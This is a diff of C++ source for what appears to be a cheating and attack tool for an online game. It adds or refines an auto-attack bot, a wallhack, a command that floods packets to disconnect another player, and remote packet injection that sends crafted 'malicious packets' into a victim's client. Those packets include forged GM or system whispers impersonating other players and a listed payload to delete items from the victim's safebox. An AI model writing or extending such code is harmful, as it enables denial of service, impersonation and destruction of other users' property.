@@ -11,15 +11,16 @@
 using namespace std;
 
 const map<string, string> Command::help_msgs = {
-	{"send", "Sends the packet built with the hexbuf. Syntax: send hexbuf"},
-	{"move", "Moves to coords (x, y). Syntax: move type x y"},
-	{"attack_target", "Attacks current target. Syntax: attack_target"},
-	{"attack", "Enables or disables the attack hack. It attracts and attacks every close enemy. Syntax: attack 0/1"},
+	{"send", "Send the packet built with the hexbuf. Syntax: send hexbuf"},
+	{"move", "Move to coords (x, y). Syntax: move type x y"},
+	{"attack", "Attack current target. Syntax: attack"},
+	{"autodmg", "Enable or disable the autodmg hack, which attracts and attacks every close enemy. Syntax: attack 0/1"},
 	{"msg", "Send a message. Syntax: msg type message"},
-	{"wallhack", "Enables or disables the wallhack. Syntax: wallhack 0/1"},
-	{"dc", "Starts trying to disconnect the player. It sends by default 20 dc packets. Syntax: dc player [packets]"},
-	{"dc_stop", "Stop strying ot disconnect the player. Syntax: dc_stop"},
-	{"inj", "Performs remote packet injection on player. Syntax: inj player"}
+	{"wallhack", "Enable or disable the wallhack. Syntax: wallhack 0/1"},
+	{"dc", "Start trying to disconnect the player. It sends by default 20 dc packets. Syntax: dc player [packets]"},
+	{"dc_stop", "Stop trying to disconnect the player. Syntax: dc_stop"},
+	{"inj", "Perform remote packet injection on player. Syntax: inj player hexbuf"},
+	{"whisp", "Send a message to a player as if it had been sent by another player. Uses packet injection. Syntax: whisp type to_player from_player msg"}
 };
 Command* const Command::instance = new Command();
 
@@ -87,15 +88,15 @@ void Command::move(byte type, int x, int y){
 	p.send();
 }
 
-void Command::attack_target(){
+void Command::attack(){
 	if (instance->id_attack){
 		CG_Attack p(0, instance->id_attack);
 		p.send();
 	} else print_err("There's no target.");
 }
 
-void Command::_attack(){
-	while (instance->attacking){
+void Command::_autodmg(){
+	while (instance->autodmg_enabled){
 		for (auto it : instance->enemies){
 			cout << "[BOT] Attacking " << it.first << endl;
 			CG_Attack p(0, it.first);
@@ -105,10 +106,10 @@ void Command::_attack(){
 	}
 }
 
-void Command::attack(bool enabled){
-	instance->attacking = enabled;
+void Command::autodmg(bool enabled){
+	instance->autodmg_enabled = enabled;
 	if (enabled)
-		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_attack, 0, 0, 0);
+		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_autodmg, 0, 0, 0);
 }
 
 string Command::process_msg(string msg){
@@ -142,7 +143,7 @@ void Command::set_wallhack(bool enabled){
 	print(string("Set wallhack ") + (enabled ? "on." : "off."));
 }
 
-void Command::_packet_injection(){
+void Command::_packet_injection(const string& username, Packet* p){
 	/*
 	[INVESTIGACION]
 	Si se pone breakpoint en parse_recv_whisper y se van viendo llegar los paquetes no ocurre el bug.
@@ -192,54 +193,39 @@ void Command::_packet_injection(){
 	packet no ocurre el bug, y siempre ocurre en la misma posición que no es al final.
 
 	Me rindo
+
+	[MALICIOUS PACKETS]
+		- Whisper
+		- Phase: "\xFD\x01"
+		- Delete from safebox: "\x56\x01"
 	*/
+	string p_buf = p->get_buf();
+	cout << "Performing packet injection to " << username << endl;
+	cout << "[MALICIOUS PACKET] " << string_to_hex(p_buf) << endl;
 
-	// VER POR QUE LECHES HA DEJADO DE FUNCIONAR DE REPENTE
+	string buf;
 
-	// MALICIOUS PACKET
-	// whisper
-
-	string username = "Lord Klecko";
-	string msg = "ola zoi un gm";
-	byte type = 5; // 5 for gm, 0xFF for system
-
-	// packet size: 0x101 ('\x01\x01'), minimum size with no nullbytes
-	username += string(25 - username.length(), ' ');
-	msg += string(0x101 - 25 - 4 - msg.length(), ' ');
-	string packet = GC_Whisper(type, username, msg).get_buf();
-
-	// phase
-	//string packet = "\xFD\x01";
-
-	// delete from safebox
-	//string packet = "\x56\x01";
-
-	cout << "Performing packet injection to " << instance->username_dc << endl;
+	// padding
 	int i;
 	char c = '\xE1';
-	
-	string buf;
-	// padding
-	for (i = 0; i < 8; i++)
-		buf += CG_Whisper(instance->username_dc, to_string(i) + string(DISCONNECT_PACKET_LEN, c++) + to_string(i)).get_buf();
+	for (i = 0; i < INJECTION_PACKET_COUNT; i++)
+		buf += CG_Whisper(username, to_string(i) + string(INJECTION_PACKET_LEN, c++) + to_string(i)).get_buf();
 
-	// packet
-	cout << "[MALICIOUS PACKET] " << string_to_hex(packet) << endl;																								   //string packet = hex_to_string("222101014B6C65636B616161616161616161616161616161616161616141414141");
-	buf += CG_Whisper(instance->username_dc, to_string(i) + string(78, c) + packet).get_buf(); // string(500-78-packet.length(), c++) + to_string(i)).get_buf();
+	// packet																							   //string packet = hex_to_string("222101014B6C65636B616161616161616161616161616161616161616141414141");
+	buf += CG_Whisper(username, to_string(i) + string(78, c) + p_buf).get_buf(); // string(500-78-packet.length(), c++) + to_string(i)).get_buf();
 
 	// Valid packet after malicious packet
 	c++;
 	i++;
-	buf += CG_Whisper(instance->username_dc, to_string(i) + string(200, c++) + to_string(i)).get_buf();
+	buf += CG_Whisper(username, to_string(i) + string(200, c++) + to_string(i)).get_buf();
 
-	Packet p(buf);
-	p.send();
+	Packet pkt(buf);
+	pkt.send();
 }
 
 void Command::_disconnect() {
 	// Igual se puede hacer gradual comprobando si el pj se ha desconectado o no
 	cout << "[BOT] Sending " << instance->disconnect_packets << " packets to disconnect " << instance->username_dc << endl;
-	char c = 'a';
 	int i = 0;
 	while (instance->disconnecting && i < instance->disconnect_packets) {
 		//cout << "[BOT] Sending msg " << i << " to " << instance->username_dc << endl;
@@ -260,9 +246,18 @@ void Command::disconnect(const string& username, int n_packets){
 	}
 }
 
-void Command::packet_injection(const string& username){
-	instance->username_dc = username;
-	_packet_injection();
+void Command::whisper(byte type, const string& to_user, string from_user, string msg) {
+	// type 5 for gm, 0xFF for system
+	from_user += string(25 - from_user.length(), ' ');
+	// packet size: 0x101 ('\x01\x01'), minimum size with no nullbytes
+	msg += string(0x101 - 25 - 4 - msg.length(), ' ');
+	GC_Whisper p(type, from_user, msg);
+	_packet_injection(to_user, &p);
+}
+
+void Command::packet_injection(const string& username, const string& hexbuf){
+	Packet p(hex_to_string(hexbuf));
+	_packet_injection(username, &p);
 }
 
 void Command::run(const string& _cmd){
@@ -285,13 +280,13 @@ void Command::run(const string& _cmd){
 		if (check = check_n_args(3, cmd))
 			move(stoi(cmd[1]), stoi(cmd[2]), stoi(cmd[3]));
 
-	} else if (cmd[0] == "attack_target") {
-		if (check = check_n_args(0, cmd))
-			attack_target();
-
 	} else if (cmd[0] == "attack") {
+		if (check = check_n_args(0, cmd))
+			attack();
+
+	} else if (cmd[0] == "autodmg") {
 		if (check = check_n_args(1, cmd))
-			attack((bool)stoi(cmd[1]));
+			autodmg((bool)stoi(cmd[1]));
 	
 	} else if (cmd[0] == "msg"){
 		if (check = check_n_args(2, cmd))
@@ -322,9 +317,14 @@ void Command::run(const string& _cmd){
 	} else if (cmd[0] == "dc_stop"){
 		instance->disconnecting = false;
 
+	} else if (cmd[0] == "whisp"){
+		if (check = check_n_args(4, cmd))
+			whisper(stoi(cmd[1]), cmd[2], cmd[3], cmd[4]);
+		// TODO. Hacer una func a la que se le pase un paquete y lo inyecte
+
 	} else if (cmd[0] == "inj") {
-		if (check = check_n_args(1, cmd))
-			packet_injection(cmd[1]);
+		if (check = check_n_args(2, cmd))
+			packet_injection(cmd[1], cmd[2]);
 
 	} else print_err("Unknown command: " + cmd[0]);
 
